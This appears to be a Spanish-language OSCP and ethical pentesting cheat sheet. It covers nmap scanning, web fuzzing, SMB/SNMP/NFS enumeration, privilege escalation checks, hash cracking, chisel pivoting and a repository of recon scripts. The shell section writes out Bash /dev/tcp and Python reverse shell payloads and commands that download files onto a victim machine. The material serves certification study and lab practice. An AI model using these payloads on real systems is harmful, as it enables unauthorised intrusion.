# Caja de Herramientas de Ciberseguridad (OSCP / Pentesting Ético)

Esta guía documenta la caja de herramientas indispensable para la preparación del OSCP (Offensive Security Certified Professional), laboratorios prácticos (Hack The Box, Proving Grounds, VulnHub) y auditorías de seguridad ofensiva.

Está optimizada para ser utilizada tanto en **Kali Linux** como en una distribución base **Ubuntu / Debian**, eliminando dependencias innecesarias y explicando el propósito exacto de cada utilidad.

---

## Índice
1. [Instalación Base en Ubuntu / Debian](#1-instalación-base-en-ubuntu--debian)
2. [Reconocimiento y Descubrimiento de Red](#2-reconocimiento-y-descubrimiento-de-red)
3. [Enumeración y Fuzzing Web](#3-enumeración-y-fuzzing-web)
4. [Enumeración de Servicios e Infraestructura](#4-enumeración-de-servicios-e-infraestructura)
5. [Gestión de Shells y Transferencia de Archivos](#5-gestión-de-shells-y-transferencia-de-archivos)
6. [Escalada de Privilegios (Privilege Escalation)](#6-escalada-de-privilegios-privilege-escalation)
7. [Cracking de Contraseñas y Hashes](#7-cracking-de-contraseñas-y-hashes)
8. [Túneles, Pivoting y Redirección](#8-túneles-pivoting-y-redirección)
9. [Scripts de Automatización Incluidos en este Repositorio](#9-scripts-de-automatización-incluidos-en-este-repositorio)

---

## 1. Instalación Base en Ubuntu / Debian

Si decides prescindir de Kali Linux y utilizar Ubuntu, puedes desplegar todo el arsenal básico con las siguientes instrucciones:

```bash
# 1. Actualización de repositorios y paquetes base
sudo apt update && sudo apt upgrade -y

# 2. Herramientas esenciales de red, análisis y compilación
sudo apt install -y \
  build-essential git curl wget netcat-traditional socat tcpdump \
  tshark nmap nikto gobuster hydra john seclists smbclient nfs-common \
  dnsutils whois proxychains4 python3 python3-pip python3-venv \
  libssl-dev libffi-dev

# 3. Asegurar alias de netcat tradicional (con soporte de -e / ejecución)
sudo update-alternatives --set nc /bin/nc.traditional

# 4. Instalación de la suite Impacket
pip install impacket --break-system-packages

# 5. Enlace simbólico de SecLists si está empaquetado en /usr/share/seclists
sudo ln -s /usr/share/seclists /usr/share/wordlists/SecLists 2>/dev/null || true
```

---

## 2. Reconocimiento y Descubrimiento de Red

### Nmap (Network Mapper)
El estándar de facto para descubrimiento de puertos y servicios.

- **Escaneo rápido inicial (todos los puertos TCP):**
  ```bash
  nmap -n -Pn -sT -p- --min-rate 1000 -T4 <IP> -oA nmap_fast
  ```
- **Escaneo detallado sobre puertos detectados:**
  ```bash
  nmap -n -Pn -sC -sV -p <PUERTOS_ENCONTRADOS> <IP> -oA nmap_detailed
  ```
- **Escaneo UDP de puertos prioritarios:**
  ```bash
  nmap -n -Pn -sU -sV --top-ports 50 <IP> -oA nmap_udp
  ```

### Descubrimiento de Hosts Activos
- **Barrido ICMP / ARP en red local:**
  ```bash
  nmap -sn <RANGO_IP> (ej. 192.168.1.0/24)
  sudo arp-scan -l
  sudo netdiscover -r <RANGO_IP>
  ```
- **Captura de tráfico en crudo con Tcpdump:**
  ```bash
  sudo tcpdump -i any not port 22 -nn -v
  ```

---

## 3. Enumeración y Fuzzing Web

### Gobuster / Wfuzz / FFuF
Búsqueda de archivos y directorios ocultos:

- **Gobuster (Directorios y extensiones comunes):**
  ```bash
  gobuster dir -u http://<IP>:<PUERTO>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak -t 30
  ```
- **Wfuzz (Fuzzing de parámetros GET / POST):**
  ```bash
  wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 "http://<IP>/index.php?FUZZ=test"
  ```
- **FFuF (Alternativa ultrarrápida en Go):**
  ```bash
  ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,403
  ```

### Análisis Web Ligero
- **WhatWeb:** Identificación de CMS, servidores, versiones y tecnologías:
  ```bash
  whatweb -v -a 3 http://<IP>
  ```
- **Nikto:** Escaneo de malas configuraciones y archivos vulnerables:
  ```bash
  nikto -h http://<IP>:<PUERTO> -Tuning 123bde -output nikto.txt
  ```

---

## 4. Enumeración de Servicios e Infraestructura

### SMB / MSRPC (Puertos 139 / 445)
- **Verificación de recursos compartidos anónimos:**
  ```bash
  smbclient -L //<IP>/ -N
  smbmap -H <IP>
  ```
- **Enumeración exhaustiva con enum4linux:**
  ```bash
  enum4linux -a <IP>
  ```
- **Volcado SAMR y MSRPC (Impacket):**
  ```bash
  samrdump.py <IP>
  rpcdump.py -port 135 <IP>
  ```

### SNMP (Puerto 161/UDP)
- **Fuerza bruta a cadenas de comunidad:**
  ```bash
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
  ```
- **Extracción de información MIB:**
  ```bash
  snmp-check <IP> -c public
  snmpwalk -c public -v 2c <IP>
  ```

### NFS (Puertos 111 / 2049)
- **Consultar carpetas exportadas:**
  ```bash
  showmount -e <IP>
  ```
- **Montaje local del recurso:**
  ```bash
  sudo mkdir -p /mnt/nfs_target
  sudo mount -t nfs <IP>:/recurso /mnt/nfs_target -o nolock
  ```

### Bases de Datos
- **MySQL (3306):**
  ```bash
  mysql -h <IP> -u root -p
  ```
- **MSSQL (1433):**
  ```bash
  impacket-mssqlclient DOMINIO/usuario:contraseña@<IP> -windows-auth
  ```

---

## 5. Gestión de Shells y Transferencia de Archivos

### Listeners Locales
- **Netcat:**
  ```bash
  nc -lvnp 4444
  ```
- **Socat (Listener cifrado o con soporte TTY):**
  ```bash
  socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0
  ```

### Payloads de Reverse Shell Comunes
- **Bash:**
  ```bash
  bash -i >& /dev/tcp/<MI_IP>/4444 0>&1
  ```
- **Python 3:**
  ```bash
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<MI_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
  ```

### Estabilización de Shell Remota (Full TTY Interactiva)
Dentro de la shell remota inicial:
```bash
# Paso 1: Generar pty interactiva
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Paso 2: Suspender la shell a segundo plano con Ctrl+Z
# (en tu máquina local atacante):
stty raw -echo; fg

# Paso 3: Reanudar y resetear terminal
reset
export TERM=xterm
export SHELL=/bin/bash
stty rows 38 columns 136  # Ajustar a las dimensiones de tu terminal (ver con 'stty size')
```

### Métodos de Transferencia
- **Servidor HTTP con Python en tu máquina:**
  ```bash
  python3 -m http.server 80
  ```
- **Descarga en Linux víctima:**
  ```bash
  wget http://<MI_IP>/archivo
  curl -O http://<MI_IP>/archivo
  ```
- **Descarga en Windows víctima (PowerShell / CertUtil):**
  ```powershell
  certutil -urlcache -f http://<MI_IP>/archivo.exe archivo.exe
  Invoke-WebRequest -Uri http://<MI_IP>/archivo.exe -OutFile archivo.exe
  ```

---

## 6. Escalada de Privilegios (Privilege Escalation)

### Linux
- **LinPEAS / LinEnum:**
  - `linpeas.sh`: El script de enumeración más completo de la actualidad.
  - [`LinEnum.sh`](file:///c:/Users/Diego%20Romero/Documents/oscpRepo/Local%20Info%20Enum/Linux/LinEnum.sh): Script clásico incluido en este repositorio.
- **Comprobaciones manuales rápidas:**
  ```bash
  sudo -l                        # Privilegios asignados en sudoers
  find / -perm -u=s -type f 2>/dev/null  # Binarios con bit SUID activo
  cat /etc/crontab /etc/cron.*   # Tareas programadas
  ss -tulpn                      # Puertos internos a la escucha
  ```

### Windows
- **WinPEAS / Seatbelt:**
  - `winPEASany.exe` o `winPEAS.bat`: Detección automática de vectores Windows.
  - [`iCacls_Service_Check.bat`](file:///c:/Users/Diego%20Romero/Documents/oscpRepo/Priv%20Esc%20Checks/Windows/iCacls_Service_Check.bat): Comprobación de permisos débiles en binarios de servicios.
- **Comprobaciones manuales rápidas:**
  ```cmd
  whoami /priv                  # Privilegios de token (SeImpersonatePrivilege, etc.)
  net user                      # Cuentas locales
  net localgroup Administrators # Miembros del grupo Administradores
  cmdkey /list                  # Credenciales cacheadas
  ```

---

## 7. Cracking de Contraseñas y Hashes

### John the Ripper
- **Cracking con diccionario:**
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  ```
- **Uso de reglas personalizadas (ver `lists/Password/Password Rulesets/john/README`):**
  ```bash
  john --wordlist=rockyou.txt --rules=TryHarder hashes.txt
  ```

### Hashcat
- **Ataque de diccionario (Modo 0):**
  ```bash
  hashcat -m <TIPO_HASH> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
  ```
- **Ataque de máscara (Modo 3 - ver `lists/Password/Password Rulesets/hashcat/README_NetSPI.txt`):**
  ```bash
  hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d
  ```

---

## 8. Túneles, Pivoting y Redirección

- **Chisel:** Túnel HTTP/WebSockets simple y rápido para evadir firewalls e interactuar con redes internas:
  - Servidor (Tu máquina):
    ```bash
    chisel server -p 8000 --reverse
    ```
  - Cliente (Máquina comprometida):
    ```bash
    chisel client <MI_IP>:8000 R:socks
    ```
- **Proxychains:** Enruta herramientas (nmap, curl, etc.) a través del proxy SOCKS:
  ```bash
  proxychains4 nmap -sT -Pn -p 80,445 10.10.10.X
  ```

---

## 9. Scripts de Automatización Incluidos en este Repositorio

En el directorio **[`scripts/recon_enum3/`](file:///c:/Users/Diego%20Romero/Documents/oscpRepo/scripts/recon_enum3)** dispones de la suite modular adaptada a Python 3:

| Script | Propósito |
| :--- | :--- |
| **`reconscan.py`** | Orquestador principal multihilo. Lanza escaneos nmap iniciales y deriva puertos abiertos a submódulos dedicados. |
| **`aliverecon.py`** | Barrido ICMP y descubrimiento multicast IPv6 para detectar hosts en línea. |
| **`dirbustEVERYTHING.py`** | Orquestación intensiva de fuerza bruta web con soporte para gobuster, dirb, wfuzz, cewl y parameth. |
| **`dirTrav.py`** | Envoltorio para dotdotpwn; descubre directory traversal y descarga archivos estructuradamente. |
| **`smbrecon.py`** | Enumeración de recursos SMB, vulnerabilidades MS17-010 / SambaCry y usuarios. |
| **`nfsrecon.py`** | Detección de exports NFS y montaje de recursos. |
| **`snmprecon.py`** | Fuerza bruta de cadenas de comunidad SNMP y volcado MIB. |
| **`webrecon.py`** | Reconocimiento HTTP con Nmap NSE, Nikto y VHostScan. |
| **`ldaprecon.py`** | Enumeración de Active Directory y LDAP con ldapdomaindump y ldapsearch. |
| **`mssqlrecon.py` / `mysqlrecon.py`** | Detección de configuración y spray de contraseñas sobre bases de datos. |
| **`sshrecon.py` / `sslrecon.py`** | Análisis de algoritmos, debilidades SSL/TLS y opciones de autenticación. |
